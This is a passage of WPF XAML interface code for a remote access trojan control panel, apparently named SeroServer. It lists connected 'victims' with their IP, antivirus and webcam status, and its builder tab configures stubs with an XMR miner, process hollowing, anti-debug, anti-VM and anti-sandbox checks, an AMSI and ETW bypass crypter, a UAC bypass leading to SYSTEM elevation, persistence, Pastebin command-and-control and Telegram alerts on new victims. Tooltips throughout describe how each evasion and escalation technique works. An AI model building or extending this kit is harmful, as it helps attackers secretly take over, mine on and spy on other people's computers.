                                                <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><Viewbox Width="13" Height="14"><Canvas Width="20" Height="22"><Canvas.Clip><PathGeometry Figures="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z"/></Canvas.Clip><Rectangle Canvas.Left="0" Canvas.Top="0" Width="10" Height="11" Fill="#1769C4"/><Rectangle Canvas.Left="10" Canvas.Top="0" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="0" Canvas.Top="11" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="10" Canvas.Top="11" Width="10" Height="11" Fill="#1769C4"/><Path Data="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z" Stroke="#0A0B18" StrokeThickness="2.5" Fill="Transparent"/><Line X1="10" Y1="0" X2="10" Y2="22" Stroke="#0A0B18" StrokeThickness="1.2"/><Line X1="0" Y1="11" X2="20" Y2="11" Stroke="#0A0B18" StrokeThickness="1.2"/></Canvas></Viewbox></MenuItem.Icon></MenuItem>
                                                <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x1F501;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
                                                <Separator/>
                                                <MenuItem Header="Update Client"       Click="UpdateClient_Click">          <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                                <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x2716;" FontSize="12" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                                <MenuItem Header="Uninstall Client"    Click="UninstallClient_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                                <Separator/>
                                                <MenuItem Header="Set Tag"             Click="SetTag_Click">                <MenuItem.Icon><TextBlock Text="&#x1F3F7;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                                <MenuItem Header="View Logs"           Click="ViewClientLogs_Click">        <MenuItem.Icon><TextBlock Text="&#x1F4DC;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
                                                <MenuItem Header="Copy IP"             Click="CopyIP_Click">                <MenuItem.Icon><TextBlock Text="&#x1F4CB;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            </MenuItem>
                                        </ContextMenu>
                                    </DataGrid.ContextMenu>
                                </DataGrid>

                                <!-- Empty state overlay for Online -->
                                <Grid Grid.Column="0" IsHitTestVisible="False">
                                    <Grid.Style>
                                        <Style TargetType="Grid">
                                            <Setter Property="Visibility" Value="Collapsed"/>
                                            <Style.Triggers>
                                                <DataTrigger Binding="{Binding Items.Count, ElementName=GridClients}" Value="0">
                                                    <Setter Property="Visibility" Value="Visible"/>
                                                </DataTrigger>
                                            </Style.Triggers>
                                        </Style>
                                    </Grid.Style>
                                    <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
                                        <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
                                        <TextBlock Text="No clients connected" Foreground="#606880" FontSize="13"
                                                   HorizontalAlignment="Center" Margin="0,8,0,0"/>
                                    </StackPanel>
                                </Grid>

                                <!-- Grid Settings Panel on the Right -->
                                <Border Grid.Column="1" x:Name="GridSettingsPanel"
                                        Width="260"
                                        Background="#0F1020"
                                        BorderBrush="#1E2038"
                                        BorderThickness="1,0,0,0"
                                        Visibility="Collapsed">
                                    <Grid Margin="16">
                                        <Grid.RowDefinitions>
                                            <RowDefinition Height="Auto" /> <!-- Header -->
                                            <RowDefinition Height="Auto" /> <!-- Filters Title -->
                                            <RowDefinition Height="Auto" /> <!-- Filters -->
                                            <RowDefinition Height="Auto" /> <!-- Columns Title -->
                                            <RowDefinition Height="*" />    <!-- Columns scroll -->
                                            <RowDefinition Height="Auto" /> <!-- Reset button -->
                                        </Grid.RowDefinitions>

                                        <!-- Header -->
                                        <Grid Grid.Row="0" Margin="0,0,0,16">
                                            <TextBlock Text="GRID SETTINGS" Foreground="#DDE0F0" FontSize="11" FontWeight="Bold" VerticalAlignment="Center"/>
                                            <Button Content="✕" HorizontalAlignment="Right" Background="Transparent" BorderThickness="0" Foreground="#606880" Cursor="Hand" Click="CloseGridSettings_Click">
                                                <Button.Template>
                                                    <ControlTemplate TargetType="Button">
                                                        <Border Background="Transparent" Padding="4">
                                                            <TextBlock Text="{TemplateBinding Content}" FontSize="12" Foreground="{TemplateBinding Foreground}"/>
                                                        </Border>
                                                    </ControlTemplate>
                                                </Button.Template>
                                            </Button>
                                        </Grid>

                                        <!-- Filters -->
                                        <TextBlock Grid.Row="1" Text="FILTERS" Style="{StaticResource SLabel}"/>
                                        <StackPanel Grid.Row="2" Margin="0,0,0,16">
                                            <CheckBox x:Name="ChkFilterWebcam" Content="📷 Webcam Only" Style="{StaticResource SettingsChk}" Checked="ChkFilterWebcam_Checked" Unchecked="ChkFilterWebcam_Unchecked" Margin="0,0,0,8"/>
                                            <CheckBox x:Name="ChkFilterAdmin" Content="⚡ Admin Only" Style="{StaticResource SettingsChk}" Checked="ChkFilterAdmin_Checked" Unchecked="ChkFilterAdmin_Unchecked"/>
                                        </StackPanel>

                                        <!-- Column Visibility -->
                                        <TextBlock Grid.Row="3" Text="COLUMN VISIBILITY" Style="{StaticResource SLabel}"/>
                                        <ScrollViewer Grid.Row="4" VerticalScrollBarVisibility="Auto" Margin="0,0,0,16">
                                            <StackPanel x:Name="StackColumnCheckboxes"/>
                                        </ScrollViewer>

                                        <!-- Reset Button -->
                                        <Button Grid.Row="5" Content="Reset Filters to Default" Click="ResetGridSettings_Click" Height="32" Cursor="Hand" Foreground="#DDE0F0" BorderBrush="#252840">
                                            <Button.Template>
                                                <ControlTemplate TargetType="Button">
                                                    <Border x:Name="bd" Background="#161A30" BorderBrush="#252840" BorderThickness="1.5" CornerRadius="4">
                                                        <TextBlock Text="{TemplateBinding Content}" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="11" FontWeight="SemiBold" Foreground="{TemplateBinding Foreground}"/>
                                                    </Border>
                                                    <ControlTemplate.Triggers>
                                                        <Trigger Property="IsMouseOver" Value="True">
                                                            <Setter TargetName="bd" Property="Background" Value="#222B54"/>
                                                            <Setter TargetName="bd" Property="BorderBrush" Value="#4A85F5"/>
                                                        </Trigger>
                                                    </ControlTemplate.Triggers>
                                                </ControlTemplate>
                                            </Button.Template>
                                        </Button>
                                    </Grid>
                                </Border>
                            </Grid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── All Clients ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="≡" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="All Clients"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <!-- Toolbar -->
                            <Border Grid.Row="0" Background="#090A16" Padding="10,6"
                                    BorderBrush="#141628" BorderThickness="0,0,0,1">
                                <StackPanel Orientation="Horizontal">
                                    <Button Content="🗑  Clear Offline" Click="ClearOfflineClients_Click"
                                            Style="{StaticResource SBtn}" Height="26" Padding="12,0"
                                            ToolTip="Remove all clients that are not currently connected"/>
                                    <TextBlock x:Name="TxtAllClientsCount" Text=""
                                               Foreground="#404878" FontSize="11" FontFamily="Consolas"
                                               VerticalAlignment="Center" Margin="14,0,0,0"/>
                                </StackPanel>
                            </Border>
                            <DataGrid Grid.Row="1" x:Name="GridAllClients"
                                      AutoGenerateColumns="False" IsReadOnly="True"
                                      Background="Transparent" Foreground="#DDE0F0"
                                      BorderThickness="0" RowBackground="Transparent"
                                      AlternatingRowBackground="#07101428"
                                      GridLinesVisibility="None" HeadersVisibility="Column"
                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
                                      VirtualizingStackPanel.IsVirtualizing="True"
                                      VirtualizingStackPanel.VirtualizationMode="Recycling"
                                      ScrollViewer.CanContentScroll="True"
                                      ScrollViewer.HorizontalScrollBarVisibility="Auto"
                                      ColumnHeaderStyle="{StaticResource SColHeader}">
                                <DataGrid.Columns>
                                    <DataGridTextColumn Header="USER"      Binding="{Binding LastUsername}"                                 Width="110" />
                                    <DataGridTextColumn Header="IP"        Binding="{Binding LastIP}"                                       Width="110" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="COUNTRY"   Binding="{Binding LastCountry}"                                  Width="110" />
                                    <DataGridTextColumn Header="MACHINE"   Binding="{Binding LastMachineName}"                              Width="120" />
                                    <DataGridTextColumn Header="OS"        Binding="{Binding LastOS}"                                       Width="115" />
                                    <DataGridTextColumn Header="AV"        Binding="{Binding LastAntivirus}"                                Width="100" FontSize="11"/>
                                    <DataGridTextColumn Header="CPU"       Binding="{Binding LastCpuName}"                                  Width="120" FontSize="11"/>
                                    <DataGridTextColumn Header="GPU"       Binding="{Binding LastGpuName}"                                  Width="120" FontSize="11"/>
                                    <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding LastPayload}"                                  Width="90"  FontSize="11"/>
                                    <DataGridTextColumn Header="RAM"        Binding="{Binding LastRamDisplay}"                               Width="105" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="FIRST SEEN" Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd HH:mm}"   Width="118" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="LAST SEEN"  Binding="{Binding LastSeen,  StringFormat=yyyy-MM-dd HH:mm}"   Width="118" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTemplateColumn Header="TAG" Width="*" SortMemberPath="Tag">
                                        <DataGridTemplateColumn.CellTemplate>
                                            <DataTemplate>
                                                <Border x:Name="TagBadge" CornerRadius="3" Padding="6,2"
                                                        Background="#221700" BorderBrush="#5A3E08" BorderThickness="1"
                                                        HorizontalAlignment="Left" Margin="2,0" Visibility="Collapsed">
                                                    <StackPanel Orientation="Horizontal">
                                                        <TextBlock Text="&#x1F3F7;" FontSize="9" Margin="0,0,4,0" VerticalAlignment="Center"/>
                                                        <TextBlock Text="{Binding Tag}" Foreground="#D4A843"
                                                                   FontSize="10" FontWeight="SemiBold" FontFamily="Segoe UI"
                                                                   VerticalAlignment="Center"/>
                                                    </StackPanel>
                                                </Border>
                                                <DataTemplate.Triggers>
                                                    <DataTrigger Binding="{Binding HasTag}" Value="True">
                                                        <Setter TargetName="TagBadge" Property="Visibility" Value="Visible"/>
                                                    </DataTrigger>
                                                </DataTemplate.Triggers>
                                            </DataTemplate>
                                        </DataGridTemplateColumn.CellTemplate>
                                    </DataGridTemplateColumn>
                                </DataGrid.Columns>
                                <DataGrid.ContextMenu>
                                    <ContextMenu>
                                        <MenuItem Header="Set Tag"    Click="SetTagRecord_Click" />
                                        <MenuItem Header="View Logs"  Click="ViewRecordLogs_Click" />
                                        <Separator />
                                        <MenuItem Header="Copy HWID"  Click="CopyRecordHwid_Click" />
                                    </ContextMenu>
                                </DataGrid.ContextMenu>
                            </DataGrid>

                            <!-- Empty state overlay for All Clients -->
                            <Grid Grid.Row="1" IsHitTestVisible="False">
                                <Grid.Style>
                                    <Style TargetType="Grid">
                                        <Setter Property="Visibility" Value="Collapsed"/>
                                        <Style.Triggers>
                                            <DataTrigger Binding="{Binding Items.Count, ElementName=GridAllClients}" Value="0">
                                                <Setter Property="Visibility" Value="Visible"/>
                                            </DataTrigger>
                                        </Style.Triggers>
                                    </Style>
                                </Grid.Style>
                                <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
                                    <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
                                    <TextBlock Text="No records found" Foreground="#606880" FontSize="13"
                                               HorizontalAlignment="Center" Margin="0,8,0,0"/>
                                </StackPanel>
                            </Grid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── Builder ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="⬧" Foreground="#7C5CE8" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Builder"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="14" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>

                            <!-- ── Page selector ── -->
                            <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
                                <Button x:Name="BtnPageRat" Width="140" Height="28"
                                        Style="{StaticResource SBtn}" Click="BtnPageRat_Click">
                                    <StackPanel Orientation="Horizontal">
                                        <TextBlock Text="🐀" Foreground="#7C5CE8" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
                                        <TextBlock Text="RAT BUILDER" VerticalAlignment="Center"/>
                                    </StackPanel>
                                </Button>
                                <Button x:Name="BtnPageXmr" Width="140" Height="28" Margin="8,0,0,0"
                                        Style="{StaticResource SBtn}" Click="BtnPageXmr_Click" Opacity="0.55">
                                    <StackPanel Orientation="Horizontal">
                                        <TextBlock Text="⛏" Foreground="#F59E0B" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
                                        <TextBlock Text="XMR MINER" VerticalAlignment="Center"/>
                                    </StackPanel>
                                </Button>
                            </StackPanel>

                            <!-- ── RAT page ── -->
                            <ScrollViewer x:Name="PageRat" Grid.Row="1" VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                            <Grid x:Name="BuilderPanel">
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="8"/>
                                    <ColumnDefinition Width="*"/>
                                </Grid.ColumnDefinitions>
                                <StackPanel Grid.Column="0" VerticalAlignment="Top">

                                <!-- CONNECTION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="CONNECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="HOSTS" Style="{StaticResource SFieldLabel}" />
                                        <ListBox x:Name="BldHosts" Style="{StaticResource SListBox}" Height="52" Margin="0,0,0,5" />
                                        <Grid Margin="0,0,0,14">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*" />
                                                <ColumnDefinition Width="Auto" />
                                                <ColumnDefinition Width="Auto" />
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldHostInput" Style="{StaticResource STxt}" />
                                            <Button Grid.Column="1" Content="+" Width="44" Margin="6,0,0,0" Style="{StaticResource SBtn}" Click="BldAddHost_Click" />
                                            <Button Grid.Column="2" Content="−" Width="44" Margin="4,0,0,0" Style="{StaticResource SBtn}" Click="BldDelHost_Click" />
                                        </Grid>
                                        <TextBlock Text="PORT" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldPort" Style="{StaticResource STxt}" Text="7777" Margin="0,0,0,8" />
                                        <CheckBox x:Name="BldUsePastebin" Content="Use Pastebin (disables direct connection)" Style="{StaticResource SChk}" IsChecked="False" Checked="BldUsePastebin_Checked" Unchecked="BldUsePastebin_Unchecked" Margin="0,0,0,6" />
                                        <TextBlock Text="PASTEBIN URL" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldPastebinUrl" Style="{StaticResource STxt}" Text="https://pastebin.com/raw/YourURL" IsEnabled="False" />
                                    </StackPanel>
                                </Border>

                                <!-- IDENTITY card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="IDENTITY" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="CLIENT ID PREFIX" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldClientIdPrefix" Style="{StaticResource STxt}" Margin="0,0,0,14" />
                                        <CheckBox x:Name="BldSetAssembly" Content="Copy assembly metadata from executable" Style="{StaticResource SChk}" Checked="BldSetAssembly_Checked" Unchecked="BldSetAssembly_Unchecked" />
                                        <TextBlock x:Name="BldAssemblyPath" Text="No executable selected" Foreground="#7880A8" Margin="0,0,0,12" FontSize="11" />
                                        <CheckBox x:Name="BldSetIcon" Content="Set custom icon from .ico file" Style="{StaticResource SChk}" Checked="BldSetIcon_Checked" Unchecked="BldSetIcon_Unchecked" />
                                        <TextBlock x:Name="BldIconPath" Text="No icon selected" Foreground="#7880A8" Margin="0,0,0,12" FontSize="11" />
                                        <CheckBox x:Name="BldUseMutex" Content="Use Mutex" Style="{StaticResource SChk}" IsChecked="True" />
                                        <TextBlock Text="MUTEX" Style="{StaticResource SFieldLabel}" Margin="0,4,0,4" />
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*" />
                                                <ColumnDefinition Width="Auto" />
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldMutex" Style="{StaticResource STxt}"
                                                     Text="Global\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}" />
                                            <Button Grid.Column="1" Content="GEN" Width="60" Margin="6,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldGenMutex_Click" />
                                        </Grid>
                                    </StackPanel>
                                </Border>
                                    </StackPanel>
                                    <StackPanel Grid.Column="2" VerticalAlignment="Top">

                                <!-- PROCESS HOLLOWING card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROCESS HOLLOWING" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldHollowing" Content="Auto-inject into legitimate process" Style="{StaticResource SChk}"
                                                  ToolTip="Process Hollowing: the stub creates a suspended copy of the target process (e.g. svchost.exe), unmaps its original code, maps the stub PE in its place, then resumes execution. The stub appears in Task Manager as a legitimate Windows process. PPID is spoofed to explorer.exe to break suspicious parent-child chains." />
                                        <StackPanel Margin="0,4,0,0"
                                                    Visibility="{Binding IsChecked, ElementName=BldHollowing, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="TARGET PROCESS" Style="{StaticResource SFieldLabel}" />
                                            <ComboBox x:Name="BldHollowTarget" MaxDropDownHeight="460"
                                                      IsEditable="True" Text=""
                                                      FontFamily="Consolas" FontSize="11"
                                                      Background="White" Foreground="#111111"
                                                      BorderBrush="#1E2038" BorderThickness="1">
                                                <ComboBox.Resources>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.WindowBrushKey}"          Color="White"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.WindowTextBrushKey}"      Color="#111111"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}"       Color="#E0E8FF"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.HighlightTextBrushKey}"   Color="#111111"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.ControlBrushKey}"         Color="White"/>
                                                </ComboBox.Resources>
                                                <ComboBox.ItemContainerStyle>
                                                    <Style TargetType="ComboBoxItem">
                                                        <Setter Property="Background" Value="White"/>
                                                        <Setter Property="Foreground" Value="#111111"/>
                                                        <Setter Property="Padding"    Value="6,5"/>
                                                        <Setter Property="Template">
                                                            <Setter.Value>
                                                                <ControlTemplate TargetType="ComboBoxItem">
                                                                    <Border x:Name="bd" Background="{TemplateBinding Background}"
                                                                            Padding="{TemplateBinding Padding}">
                                                                        <ContentPresenter/>
                                                                    </Border>
                                                                    <ControlTemplate.Triggers>
                                                                        <Trigger Property="IsHighlighted" Value="True">
                                                                            <Setter TargetName="bd" Property="Background" Value="#E0E8FF"/>
                                                                        </Trigger>
                                                                        <Trigger Property="IsSelected" Value="True">
                                                                            <Setter TargetName="bd" Property="Background" Value="#C8D8FF"/>
                                                                        </Trigger>
                                                                    </ControlTemplate.Triggers>
                                                                </ControlTemplate>
                                                            </Setter.Value>
                                                        </Setter>
                                                    </Style>
                                                </ComboBox.ItemContainerStyle>
                                                <ComboBox.ItemTemplate>
                                                    <DataTemplate>
                                                        <Grid MinWidth="360">
                                                            <Grid.ColumnDefinitions>
                                                                <ColumnDefinition Width="180" />
                                                                <ColumnDefinition Width="50" />
                                                                <ColumnDefinition Width="*" />
                                                            </Grid.ColumnDefinitions>
                                                            <TextBlock Grid.Column="0" Text="{Binding Proc}" FontWeight="SemiBold"
                                                                       Foreground="#111111" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
                                                            <TextBlock Grid.Column="1" Text="{Binding Score}" Foreground="{Binding ScoreColor}"
                                                                       FontWeight="Bold" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
                                                            <TextBlock Grid.Column="2" Text="{Binding Note}" Foreground="#667088"
                                                                       FontFamily="Consolas" FontSize="10" VerticalAlignment="Center" />
                                                        </Grid>
                                                    </DataTemplate>
                                                </ComboBox.ItemTemplate>
                                            </ComboBox>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>

                                <!-- PROTECTION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldAntiDebug"   Content="Anti-Debug"                                     Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Detects debuggers using multiple methods: IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess (DebugPort), NtSetInformationThread (ThreadHideFromDebugger), and a timing-based check. If a debugger is detected the stub exits silently." />
                                        <CheckBox x:Name="BldAntiVM"      Content="Anti-VM"                                        Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Detects virtual machines by checking BIOS registry strings for VMware/VirtualBox keywords, VMware Tools registry key, and VirtualBox Guest Additions. Exits silently if a VM is detected." />
                                        <CheckBox x:Name="BldAntiDetect"  Content="Anti-Detect (analysis tools)"                   Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Scans running processes for known analysis tools: x64dbg, IDA Pro, OllyDbg, Wireshark, Process Hacker, Fiddler, Ghidra, and others. Also checks for suspicious usernames (sandbox accounts) and blocks execution in CIS countries (RU/BY/KZ/UA/AM etc.)." />
                                        <CheckBox x:Name="BldAntiSandbox" Content="Anti-Sandbox"                                   Style="{StaticResource SChk}" IsChecked="True"
                                                  ToolTip="Scores the environment across multiple indicators: uptime under 3 minutes, sleep-acceleration detection (checks if Sleep() returns faster than expected), fewer than 3 temp files, under 1 GB RAM, fewer than 8 installed programs. Exits if the score exceeds the sandbox threshold." />
                                        <CheckBox x:Name="BldAntiKill"    Content="Anti-Kill"                                      Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="Protects the stub process from being killed: sets an empty DACL (denies PROCESS_TERMINATE and PROCESS_SUSPEND_RESUME for Everyone) so Task Manager, Process Explorer, and taskkill.exe fail with Access Denied. Also spawns 4 guardian processes in dllhost.exe / SearchProtocolHost.exe with PPID spoofing that restart the stub if it is killed. Windows shutdown bypasses DACL cleanly — no BSOD on reboot."
                                                  Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <TextBlock x:Name="TxtMaxPersist" Margin="18,2,0,0" FontSize="10"
                                                   Foreground="#22C55E" FontWeight="SemiBold"
                                                   Text="✓ Persistance maximale" Visibility="Collapsed" />
                                    </StackPanel>
                                </Border>

                                <!-- OBFUSCATION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="OBFUSCATION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldEncrypt"   Content="Crypter (AES-256, polymorphic, AMSI+ETW bypass) — closed-source"  Style="{StaticResource SChk}"
                                                  ToolTip="Wraps the stub in a native C++ loader that: (1) compresses with LZNT1, (2) encrypts with AES-256-CBC using a random per-build key split across 3 binary locations, (3) patches ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) in memory before executing the stub so Defender cannot scan it. Polymorphic: random key, random function names, random junk code, unique BuildId GUID per build." />
                                        <CheckBox x:Name="BldUacBypass" Content="UAC Bypass + SYSTEM elevation (fodhelper chain) — closed-source" Style="{StaticResource SChk}"
                                                  ToolTip="Step 1 — UAC Bypass: tries a chain of methods silently without showing a UAC prompt (SilentCleanup task hijack → fodhelper ms-settings → sdclt → computerdefaults → mmc). Step 2 — SYSTEM elevation: once admin, acquires SeDebugPrivilege, duplicates the token from winlogon.exe, and relaunches the stub as SYSTEM." />
                                        <CheckBox x:Name="BldUpx" Content="UPX compression (upx.exe must be in PATH or tools/)" Style="{StaticResource SChk}"
                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces ~8 MB → ~3.5 MB. Requires upx.exe in PATH or in the tools/ folder next to SeroServer.exe." />
                                        <Border Margin="18,2,0,0" Padding="8,5"
                                                Background="#1AF59E0B" BorderBrush="#60F59E0B"
                                                BorderThickness="1" CornerRadius="5"
                                                Visibility="{Binding IsChecked, ElementName=BldUacBypass, Converter={StaticResource BoolToVis}}">
                                            <TextBlock FontSize="10" Foreground="#F59E0B" TextWrapping="Wrap"
                                                       Text="⚠  UAC bypass utilise le loader natif C++ — le crypter sera appliqué automatiquement." />
                                        </Border>
                                    </StackPanel>
                                </Border>

                                <!-- PERSISTENCE card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PERSISTENCE" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldPersistRegistry" Content="Registry (HKCU\Run)"  Style="{StaticResource SChk}" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <CheckBox x:Name="BldPersistStartup"  Content="Startup Folder"       Style="{StaticResource SChk}" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <CheckBox x:Name="BldPersistTask"     Content="Scheduled Task"        Style="{StaticResource SChk}" IsChecked="True" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <StackPanel x:Name="BldInstallPanel">
                                            <StackPanel Orientation="Horizontal" Margin="0,4,0,4">
                                                <TextBlock Text="Install folder: " Foreground="#606880" FontSize="12" VerticalAlignment="Center" Width="90" />
                                                <TextBox x:Name="BldInstallFolder" Style="{StaticResource STxt}" Width="160" Text="Windows" />
                                            </StackPanel>
                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
                                                <TextBlock Text="File name:      " Foreground="#606880" FontSize="12" VerticalAlignment="Center" Width="90" />
                                                <TextBox x:Name="BldInstallFileName" Style="{StaticResource STxt}" Width="160" Text="windows.exe" />
                                            </StackPanel>
                                        </StackPanel>
                                        <TextBox x:Name="BldAuthKey"  Visibility="Collapsed" />
                                        <TextBox x:Name="BldCertHash" Visibility="Collapsed" />
                                    </StackPanel>
                                </Border>

                                <!-- NOTIFICATIONS card (Telegram) -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="NOTIFICATIONS" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldTelegramEnabled"
                                                  Content="Telegram — notify on first execution"
                                                  Style="{StaticResource SChk}"
                                                  ToolTip="Sends a message when a new victim runs the stub for the first time (client ID, IP, CPU, OS, admin status)."/>
                                        <StackPanel Margin="0,6,0,0"
                                                    Visibility="{Binding IsChecked, ElementName=BldTelegramEnabled, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="BOT TOKEN" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldTelegramToken" Style="{StaticResource STxt}"
                                                     Margin="0,0,0,6"
                                                     ToolTip="Get from @BotFather — format: 123456789:ABCdef…"/>
                                            <Grid Margin="0,0,0,0">
